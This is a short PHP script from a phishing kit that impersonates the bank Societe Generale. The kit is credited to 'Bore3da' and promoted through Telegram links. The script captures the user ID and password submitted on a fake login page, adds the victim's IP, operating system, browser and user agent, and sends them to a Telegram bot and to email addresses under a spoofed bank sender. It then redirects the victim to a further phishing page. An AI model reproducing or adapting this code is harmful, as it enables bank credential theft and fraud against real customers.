<?php
/**

 * Group Chat   :   https://t.me/bore3da_chat 
 * @telegram   :   @Bore3da 
 * Project Name:   SG 2024
 * Author      :   Bore3da

 * channel Telegram  :  https://t.me/bore3dashop
 */
if(isset($_POST['user_id']) && isset($_POST['Pass'])){
	
include "../config.php";
include "funcs.php";

$user = $_POST['user_id'];
$password =  $_POST['Pass'];

$message = "\nʙᴏʀᴇ3ᴅᴀ\n----\n💻ID: $user\n🔑Password: $password\n🕹️OS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\n🕹️Browser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\n🕹️IP : $ip\n🕹️Agent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";
toTG($message);
$headers = "From: Societe Generale |  <noreply@pabloescobard.com>";
//$headers .= "Content-type: text/html; charset=UTF-8\n";
$subject = "  💻 Login | $ip";

$emaillist = explode(',',$to);

foreach($emaillist as $email){
mail($email,$subject,$message,$headers,$head);
}

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../tel.php\" />";



}
?>